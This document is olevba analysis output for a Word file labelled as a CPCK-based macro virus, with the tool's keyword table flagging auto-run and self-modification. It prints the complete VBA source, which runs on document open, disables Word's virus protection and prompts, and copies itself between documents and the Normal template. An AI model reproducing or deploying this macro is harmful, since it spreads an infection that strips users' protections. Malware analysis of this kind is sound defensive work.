olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-ed9f99d1399fd75c01d019a5b7cde5772e20dd60
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-ed9f99d1399fd75c01d019a5b7cde5772e20dd60 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
On Error Resume Next
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
Options.SaveNormalPrompt = 0
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
Application.EnableCancelKey = 0
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
RC24 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
Options.ConfirmConversions = 0
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
Options.VirusProtection = 0
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
CO49 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
If CO49 > 0 And RC24 > 0 Then GoTo JO36
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
If CO49 = 0 Then
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
Set KT74 = ActiveDocument.VBProject.VBComponents.Item(1)
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
IH6 = True
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
End If
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
If RC24 = 0 Then
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
Set KT74 = NormalTemplate.VBProject.VBComponents.Item(1)
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
FV52 = True
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
End If
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
If FV52 <> True And IH6 <> True Then GoTo JO36
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
If FV52 = True Then KT74.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CO49 - 1))
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
If IH6 = True Then KT74.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RC24 - 1))
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
With KT74.CodeModule
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
For x = 2 To (KT74.CodeModule.CountOfLines - 1) Step 2
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
Next x
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
End With
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
JO36:
'TesterTtest.doctest.doc2/23/01 5:55:14 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

